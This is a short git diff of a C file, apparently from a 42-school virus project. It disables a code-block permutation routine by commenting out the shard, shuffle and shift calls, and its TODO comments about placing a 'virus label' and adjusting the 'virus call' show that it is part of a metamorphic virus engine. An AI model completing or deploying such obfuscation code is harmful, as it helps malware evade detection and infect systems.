@@ -6,7 +6,7 @@
 /*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/03/01 17:19:22 by ichkamo           #+#    #+#             */
-/*   Updated: 2020/03/01 19:49:02 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/12/01 14:52:06 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -45,12 +45,14 @@ static bool	apply_shift_blocks(void *code, size_t size, \
 bool		permutate_blocks(void *code, uint64_t seed, size_t size)
 {
 	struct block_allocation		block_memory;
-	struct code_block		*blocks[MAX_BLOCKS];
 
 	if (!disasm_block(&block_memory, code, size)
-	|| !shard_block(&block_memory, blocks)
-	|| !shuffle_blocks(blocks, seed)
-	|| !apply_shift_blocks(code, size, blocks))
+	// // TODO add virus label at right position
+	// || !shard_block(&block_memory, blocks)
+	// || !shuffle_blocks(blocks, seed)
+	// // TODO adjust virus call according to label shift amount
+	// || !apply_shift_blocks(code, size, blocks)
+	|| !true)
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 
 	return true;
